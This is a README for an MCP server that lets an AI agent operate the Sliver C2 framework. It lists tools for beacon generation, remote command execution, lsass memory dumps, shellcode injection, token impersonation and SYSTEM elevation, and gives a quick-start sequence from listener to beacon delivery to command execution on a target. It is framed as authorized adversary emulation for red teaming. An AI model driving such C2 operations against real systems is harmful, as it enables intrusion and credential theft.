```text
███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ███╗   ███╗ ██████╗██████╗
██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗     ████╗ ████║██╔════╝██╔══██╗
███████╗██║     ██║██║   ██║█████╗  ██████╔╝████╗██╔████╔██║██║     ██████╔╝
╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗╚═══╝██║╚██╔╝██║██║     ██╔═══╝
███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║     ██║ ╚═╝ ██║╚██████╗██║
╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═╝     ╚═╝ ╚═════╝╚═╝
   drive the Sliver C2 operator surface from an AI agent
```

![python](https://img.shields.io/badge/python-3.11%2B-3776AB?logo=python&logoColor=white)
![mcp](https://img.shields.io/badge/MCP-server-7C3AED)
![c2](https://img.shields.io/badge/C2-Sliver-000000)
![tests](https://img.shields.io/badge/tests-64%20passing-3DA639)
![license](https://img.shields.io/badge/license-MIT-blue)

A [Model Context Protocol](https://modelcontextprotocol.io) server for the
[Sliver](https://github.com/BishopFox/sliver) C2 framework. It exposes the Sliver operator
surface — listeners, implant/beacon generation, sessions and beacons, command execution, file
operations, and a structured handoff — as `mcp__sliver__*` tools an LLM agent can drive.

It is the **C2 layer of the AI-offsec stack**, built to slot in alongside the
[p0rtix](https://github.com/v0idravl/p0rtix) (recon) and p0cs (exploit staging and delivery) MCP servers
and orchestrated by the [dagar-red](https://github.com/v0idravl/dagar-red) skill system. It
mirrors their conventions: Python + FastMCP, async tools, structured-dict returns, and a
noise / `arm_dangerous` safety gate.

> ⚠️ **Authorized use only.** This drives a live C2 framework. Use it only against infrastructure
> you own or are explicitly authorized to test — owned labs, CTFs, and contracted engagements.
> It is built for adversary *emulation*: standing up realistic C2 so defenders can test and
> improve detection and response. The noise tiers and the `arm_dangerous` gate exist to keep
> operation deliberate and in scope.

---

## ⚡ Quick start

```bash
# install
git clone git@github.com:v0idravl/sliver-mcp.git && cd sliver-mcp
python3 -m venv venv && ./venv/bin/pip install -e .

# register with Claude Code (see below), then in-agent:
connect()                         # attach to your team server
set_noise("yellow")               # allow actions that touch a host
start_https_listener(port=443)
generate_beacon(c2_host="<redirector>", os="windows")
# … deliver the beacon, then …
poll_events(); list_sessions(); execute_command(id, "whoami")
```

Requires Python ≥ 3.11 and a reachable Sliver **team server** with an operator config (`.cfg`).
See [`docs/live-test.md`](docs/live-test.md) for standing up a local server and generating one.

---

## 🧠 How it relates to Sliver's built-in MCP

Sliver ships an experimental built-in MCP, but it is **filesystem-only** (≈11 tools: `fs_ls`,
`fs_cat`, `fs_rm`, …). `sliver-mcp` is a **superset** focused on the full operator workflow —
listeners, payload generation, sessions/beacons, execution, and cross-tool handoff — so an agent
can run an engagement end to end.

---

## 🔌 Register with Claude Code

Add to `~/.claude.json` (or via `claude mcp add`). Point `SLIVER_CONFIG` at your operator config:

```json
"sliver": {
  "type": "stdio",
  "command": "/home/youruser/projects/sliver-mcp/venv/bin/sliver-mcp",
  "args": [],
  "env": { "SLIVER_CONFIG": "/home/youruser/.sliver-client/configs/operator.cfg" }
}
```

The server starts whether or not the team server is up — call `connect()` first; tools that need
a live client return a structured "not connected" error until it succeeds.

---

## 🧰 Tool surface (`mcp__sliver__*`)

| Category | Tools | What they do |
|----------|-------|--------------|
| Connection / state | `connect`, `status`, `get_version`, `poll_events`, `disconnect` | attach to the team server, check health, drain the async event queue (new callbacks, task results) |
| Listeners | `start_https_listener`, `start_http_listener`, `start_mtls_listener`, `start_dns_listener`, `start_wg_listener`, `list_jobs`, `kill_job` | stand up / tear down C2 listeners across protocols |
| Implant generation | `generate_implant`, `generate_beacon`, `list_implant_builds`, `list_implant_profiles`, `regenerate_implant`, `regenerate_or_build`, `remove_implant_build` | build session implants and async beacons; reuse profiles and prior builds; prune stale builds |
| Sessions / beacons | `list_sessions`, `list_beacons`, `session_info`, `beacon_info`, `kill_session`, `kill_beacon` | enumerate and inspect callbacks; retire them |
| Execution | `execute`, `execute_command`, `get_beacon_tasks` | run a binary / run a shell command on a session or beacon; poll a beacon's queued/completed tasks |
| File operations | `ls`, `pwd`, `cd`, `mkdir`, `download`, `upload`, `rm` | navigate and move files on the target |
| Pivots | `list_pivots` | enumerate pivot listeners on a session |
| Handoff | `export_handoff`, `ingest_handoff` | exchange C2 state with the rest of the stack |
| Post-exploitation | `execute_assembly`, `execute_shellcode`, `ps`, `process_dump`, `screenshot`, `ifconfig`, `netstat` | run .NET assemblies in-memory (SharpHound, Rubeus, Seatbelt, etc.), inject shellcode into a process, enumerate processes, dump process memory (lsass), capture desktop screenshots, list network interfaces and active connections |
| Token operations | `make_token`, `impersonate`, `revert_to_self`, `run_as`, `migrate` | create a token with supplied credentials, impersonate a token by PID, drop impersonation, run a command as another user, migrate implant to another process |
| Registry | `registry_read`, `registry_write` | read and write registry key values |
| Elevated | `get_system` | attempt SYSTEM elevation (requires `arm_dangerous`) |
| SOCKS / Tunneling | `start_socks`, `stop_socks`, `start_portfwd`, `stop_portfwd`, `list_tunnels` | SOCKS5 proxy via a session (auto-writes `~/.cache/dagar-proxychains.conf` so p0rtix nmap tunnels through), port forwards, list active proxies and port forwards |
| Engagement state | `open_store`, `export_state` | open/create a dagar-state SQLite engagement store; export current store as JSON |
| Safety | `set_noise`, `arm_dangerous` | raise the noise ceiling / unlock destructive actions |

---

## 🚦 Safety / noise model

Every tool carries a noise **tier**. A call above the current ceiling is refused with a
structured reason — never silently downgraded.

| Tier | Meaning | Examples |
|------|---------|----------|
| `passive` | read-only state | `status`, `list_sessions`, `export_handoff` |
| `green` | build / stand up our own infra | listeners, `generate_*`, `ls`, `download` |
| `yellow` | actions that touch the target | `execute`, `upload`, `kill_session` |
| `red` | destructive | `rm` (also requires `arm_dangerous()`) |

The default ceiling is **green**: call `set_noise("yellow")` before running commands on a host
(the sliver-ops loop does this explicitly), and `arm_dangerous()` to unlock `rm`.

---

## 🔁 Typical loop

```text
connect()
set_noise("yellow")
start_https_listener(port=443, domain="<redirector>")
generate_beacon(c2_host="<redirector>", os="windows", interval=60, jitter=30)
# … deliver the beacon — see docs/delivery.md for session-safe detachment …
poll_events()            # watch for the callback
list_sessions()
execute_command(target_id, "whoami")
start_socks(session_id, 1080)  # auto-writes proxychains.conf → p0rtix nmap tunnels through
export_handoff()         # feed C2 state back to internal-dispatch
```

### Beacons vs sessions

`execute` and the file tools accept either a **session** id (interactive, low latency) or a
**beacon** id (asynchronous — the result returns after the next check-in, every `interval` ±
`jitter` seconds). Use `poll_events()` to watch for new callbacks and task completion.

For a beacon, if the next check-in does not arrive within `SLIVER_TASK_TIMEOUT` (default 300s),
`execute` / `execute_command` return a structured status instead of a bare timeout error:
`task_state="queued"` (the task is pending and will run on the next check-in, with `next_checkin`
timing) or `task_state="dead"` (the beacon is gone). Poll `get_beacon_tasks(beacon_id)` to see
whether a queued task has since been picked up.

### dagar-state integration

When `open_store(engagement)` is called, sliver-mcp tracks sessions, routes, and privilege
escalations in a shared SQLite DB that p0rtix also writes to — so the full engagement picture
(hosts, services, creds, sessions) is queryable in one place.

---

## ⚠️ Known limitations (v1)

These reflect the current sliver-py surface, not the design:

- **No interactive PTY shell.** A streaming PTY can't be a single request/response tool;
  `execute_command` covers command execution.
- **No `cp` / `chmod` / `chown`** — not in sliver-py's base command set.
  Planned once upstream exposes them.

---

## 🩹 Troubleshooting

| Symptom | Fix |
|---|---|
| Every tool returns "not connected" | Call `connect()` first. The server starts without the team server; tools needing a live client wait for a successful connect. |
| `connect()` fails | Check `SLIVER_CONFIG` points at a valid operator `.cfg`, and that the team server is reachable (host/port in the config). See [`docs/live-test.md`](docs/live-test.md). |
| A call is "refused: above noise ceiling" | Raise it deliberately: `set_noise("yellow")` for target-touching actions, `arm_dangerous()` for `rm`. |
| No callback after delivery | `poll_events()` drains the async queue; beacons only report on the next `interval` ± `jitter` check-in. |

---

## 🧪 Tests

```bash
./venv/bin/pip install -e '.[dev]'
./venv/bin/pytest          # 64 tests, no live server required
```

The suite mocks sliver-py, so it is green on a clean machine. For a live end-to-end smoke test,
see [`docs/live-test.md`](docs/live-test.md).

---

## License

MIT. See [`LICENSE`](LICENSE).
